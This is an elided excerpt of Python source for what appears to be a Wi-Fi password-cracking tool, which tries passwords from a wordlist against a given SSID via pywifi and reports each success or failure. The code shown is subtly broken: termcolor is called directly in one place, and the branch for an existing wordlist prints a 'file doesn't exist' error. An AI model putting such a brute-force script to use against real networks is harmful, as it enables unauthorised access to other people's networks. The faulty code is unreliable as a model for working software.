...
def wconnection(ssid:str, password:str, wordlist_step:int) -> None: 
    ...
    if iface.status() == pywifi.const.IFACE_CONNECTED : 
        print(termcolor.colored(f"Step {wordlist_step}: [*] Connected successfully to ssid={ssid}:key={password}", 'red'))
        input()
    else :
        print(termcolor.colored(f"Step {wordlist_step}: [!] Password {password} failed ! trying the next one.", 'green'))
...
def main(ssid:str, wordlist:str):
    ...
    if os.path.exists(wordlist):
        ...
        print(termcolor(f"[-] Error : File {wordlist} doesn't exist", 'red'))
